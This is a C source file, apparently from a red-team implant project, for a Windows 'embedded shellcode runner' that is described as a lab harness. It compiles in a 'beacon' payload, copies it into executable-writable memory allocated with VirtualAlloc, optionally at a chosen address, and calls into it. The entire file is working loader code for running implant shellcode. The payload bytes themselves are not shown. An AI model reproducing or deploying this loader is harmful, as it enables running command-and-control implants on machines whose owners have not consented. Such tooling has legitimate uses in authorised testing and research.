/*
 * Lab harness: single-file runner — shellcode is compiled in (see Makefile target runner-embedded).
 * Same execution model as shellcode_runner.exe (map RWX, jump to entry), no separate .bin at runtime.
 * Embedded payload matches beacon.bin (trampoline at offset 0).
 *
 * Build (from imps/win-stargate, after "make raw"):
 *   make runner-embedded
 *
 * Usage:
 *   tools\shellcode_embedded_runner.exe [alloc_base_hex]
 *
 * Optional alloc_base_hex: VirtualAlloc hint (e.g. 0x0000014000000000). Omit for OS-chosen base.
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <ctype.h>
#include <windows.h>

/*
 * beacon.bin from `make raw` begins with an E9 trampoline; entry offset is 0 unless you
 * embed a custom blob via xxd without that prefix.
 */
#ifndef EMBEDDED_ENTRY_OFFSET
#  define EMBEDDED_ENTRY_OFFSET 0
#endif

extern unsigned char beacon_bin[];
extern unsigned int beacon_bin_len;

static unsigned long long parse_hex(const char *s, int *ok)
{
    char *end = NULL;
    unsigned long long v;
    *ok = 0;
    while (s && isspace((unsigned char)*s)) s++;
    if (!s || !*s) return 0;
    v = strtoull(s, &end, 0);
    if (end && end != s && (*end == '\0' || isspace((unsigned char)*end))) {
        *ok = 1;
        return v;
    }
    return 0;
}

int main(int argc, char **argv)
{
    unsigned long long entry_off = (unsigned long long)EMBEDDED_ENTRY_OFFSET;
    size_t n = (size_t)beacon_bin_len;

    if (n < 1) {
        fprintf(stderr, "shellcode_embedded_runner: embedded payload empty\n");
        return 1;
    }
    if ((unsigned long long)n < entry_off) {
        fprintf(stderr, "shellcode_embedded_runner: entry offset 0x%llx past end of blob (%zu)\n",
                (unsigned long long)entry_off, n);
        return 1;
    }

    void *fixed = NULL;
    if (argc > 1) {
        int ok = 0;
        unsigned long long u = parse_hex(argv[1], &ok);
        if (ok && u != 0) fixed = (void *)(uintptr_t)u;
    }

    void *map = NULL;
    if (fixed) {
        map = VirtualAlloc(fixed, (SIZE_T)n, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!map) {
            fprintf(stderr,
                    "shellcode_embedded_runner: VirtualAlloc at %p failed (err %lu) — try without "
                    "argv[1].\n",
                    fixed, (unsigned long)GetLastError());
            return 1;
        }
    } else {
        map = VirtualAlloc(NULL, (SIZE_T)n, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }
    if (!map) {
        fprintf(stderr, "shellcode_embedded_runner: VirtualAlloc failed: %lu\n",
                (unsigned long)GetLastError());
        return 1;
    }

    memcpy(map, beacon_bin, n);

    unsigned char *entry = (unsigned char *)map + entry_off;
    FlushInstructionCache(GetCurrentProcess(), map, (SIZE_T)n);

    printf("shellcode_embedded_runner: %zu bytes embedded, mapped at %p, entry +0x%llx (%p)", n, map,
           (unsigned long long)entry_off, (void *)entry);
    if (fixed) printf(", alloc hint %p", fixed);
    printf(" — calling...\n");
    fflush(stdout);

    void (*sc)(void) = (void (*)(void))entry;
    sc();

    printf("shellcode_embedded_runner: returned from shellcode.\n");
    VirtualFree(map, 0, MEM_RELEASE);
    return 0;
}
